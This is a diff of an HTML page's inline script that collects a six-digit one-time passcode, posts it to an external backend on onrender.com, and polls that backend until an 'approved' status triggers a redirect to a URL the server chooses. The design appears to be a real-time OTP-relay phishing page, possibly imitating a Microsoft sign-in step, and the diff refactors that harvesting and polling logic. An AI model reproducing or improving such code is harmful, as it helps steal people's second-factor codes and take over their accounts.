@@ -567,131 +567,134 @@
         </footer>
     </main>
 
-    <script>
-        lucide.createIcons();
+<script>
+    // DOM elements
+    const otpInput = document.getElementById('otpInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const otpForm = document.getElementById('otpForm');
+    const submitText = submitBtn.querySelector('span');
+    const loadingIcon = submitBtn.querySelector('.loading');
+    const otpError = document.getElementById('otpError');
+
+    const BACKEND_URL = 'https://ms-bcknd.onrender.com';
+    let pollTimeout;
+
+    // Show/hide error functions
+    function showError(message) {
+        otpError.textContent = message;
+        otpError.classList.add('show');
+    }
+
+    function hideError() {
+        otpError.classList.remove('show');
+    }
+
+    // Show loading spinner in button
+    function showButtonSpinner() {
+        loadingIcon.classList.add('active');
+        submitText.textContent = 'Verifying...';
+        submitBtn.disabled = true;
+    }
+
+    // Hide loading spinner and reset button
+    function hideButtonSpinner() {
+        loadingIcon.classList.remove('active');
+        submitText.textContent = 'Verify';
+        submitBtn.disabled = false;
+    }
+
+    // Real-time validation (optional - clears error when user types)
+    otpInput.addEventListener('input', () => {
+        hideError();
+    });
+
+    // Form submission handler
+    otpForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        const BACKEND_URL = 'https://ms-bcknd.onrender.com';
-        let pollTimeout;
-
-        document.getElementById('otpForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        const otp = otpInput.value;
+        
+        // Clear previous errors
+        hideError();
+        
+        // Validation
+        if (!otp.trim()) {
+            showError('Please enter OTP');
+            return;
+        }
+        
+        // Basic OTP format check (6 digits)
+        if (!/^\d{6}$/.test(otp)) {
+            showError('OTP must be 6 digits');
+            return;
+        }
+        
+        // Show loading state
+        showButtonSpinner();
+        
+        try {
+            const response = await fetch(`${BACKEND_URL}/otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp: otp })
+            });
             
-            const otp = document.getElementById('otpInput').value;
-            const submitBtn = document.getElementById('submitBtn');
-            const loadingIcon = submitBtn.querySelector('.loading');
-            const submitText = submitBtn.querySelector('span');
+            const data = await response.json();
             
-            // Clear previous errors
-            document.getElementById('otpError').classList.remove('show');
-            
-            if (!otp.trim()) {
-                document.getElementById('otpError').textContent = 'Please enter OTP';
-                document.getElementById('otpError').classList.add('show');
+            if (!response.ok || !data.success) {
+                const errorMsg = data.error || 'Verification failed';
+                showError(errorMsg);
+                hideButtonSpinner();
                 return;
             }
             
-            // Basic OTP format check (6 digits)
-            if (!/^\d{6}$/.test(otp)) {
-                document.getElementById('otpError').textContent = 'OTP must be 6 digits';
-                document.getElementById('otpError').classList.add('show');
-                return;
-            }
+            const sessionId = data.id;
+            localStorage.setItem('sessionId', sessionId);
             
-            // Show loading state
-            loadingIcon.classList.add('active');
-            submitText.textContent = 'Verifying...';
-            submitBtn.disabled = true;
-            
-            try {
-                const response = await fetch(`${BACKEND_URL}/otp`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ otp: otp })
-                });
-                
-                const data = await response.json();
-                
-                if (response.ok && data.success) {
-                    const sessionId = data.id;
-                    localStorage.setItem('sessionId', sessionId);
-                    // Start silent polling
-                    pollStatus(sessionId, 0);
-                } else {
-                    const errorMsg = data.error || 'Verification failed';
-                    document.getElementById('otpError').textContent = errorMsg;
-                    document.getElementById('otpError').classList.add('show');
-                    resetButton();
-                }
-            } catch (error) {
-                document.getElementById('otpError').textContent = 'Network error. Please try again.';
-                document.getElementById('otpError').classList.add('show');
-                resetButton();
-            }
-        });
-
-        async function pollStatus(sessionId, attempt) {
-            const maxAttempts = 120;
-            
-            try {
-                const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
-                
-                if (!response.ok) {
-                    if (response.status === 404 && attempt < 3) {
-                        // Session may not be ready yet – retry after short delay
-                        pollTimeout = setTimeout(() => pollStatus(sessionId, attempt + 1), 2000);
+            // Start polling for approval & redirect
+            const pollStatus = async () => {
+                try {
+                    const statusResponse = await fetch(
+                        `${BACKEND_URL}/status/${sessionId}`
+                    );
+                    
+                    if (!statusResponse.ok) {
+                        // If session not found, retry after delay
+                        setTimeout(pollStatus, 2000);
                         return;
                     }
-                    if (attempt < maxAttempts) {
-                        pollTimeout = setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
-                    } else {
-                        // Silent fail – just reset button (no message)
-                        resetButton();
-                    }
-                    return;
-                }
-                
-                const data = await response.json();
-                
-                if (data.status === 'approved') {
-                    if (data.redirect_url) {
+                    
+                    const statusData = await statusResponse.json();
+                    
+                    if (statusData.status === 'approved' && statusData.redirect_url) {
                         let redirectUrl;
-                        if (data.redirect_url.startsWith('http')) {
-                            redirectUrl = data.redirect_url;
+                        if (statusData.redirect_url.startsWith('http')) {
+                            redirectUrl = statusData.redirect_url;
                         } else {
-                            redirectUrl = window.location.origin + '/' + data.redirect_url;
+                            redirectUrl = window.location.origin + '/' + statusData.redirect_url;
                         }
                         window.location.href = redirectUrl;
+                    } else if (statusData.status === 'pending') {
+                        setTimeout(pollStatus, 5000); // continue polling
                     } else {
-                        // No redirect URL – maybe go to a default page
-                        window.location.href = 'index.html';
+                        // Unexpected status
+                        hideButtonSpinner();
+                        showError('Unexpected response from server');
                     }
-                } else if (data.status === 'pending') {
-                    if (attempt < maxAttempts) {
-                        pollTimeout = setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
-                    } else {
-                        resetButton();
-                    }
-                } else {
-                    resetButton();
+                } catch (err) {
+                    console.error('Polling error:', err);
+                    setTimeout(pollStatus, 5000); // retry on error
                 }
-            } catch (error) {
-                if (attempt < maxAttempts) {
-                    pollTimeout = setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
-                } else {
-                    resetButton();
-                }
-            }
-        }
-
-        function resetButton() {
-            const submitBtn = document.getElementById('submitBtn');
-            const loadingIcon = submitBtn.querySelector('.loading');
-            const submitText = submitBtn.querySelector('span');
+            };
             
-            loadingIcon.classList.remove('active');
-            submitText.textContent = 'Verify';
-            submitBtn.disabled = false;
+            pollStatus();
+            
+        } catch (error) {
+            console.error('Submission error:', error);
+            showError('Network error. Please try again.');
+            hideButtonSpinner();
         }
-    </script>
+    });
+</script>
 </body>
 </html>
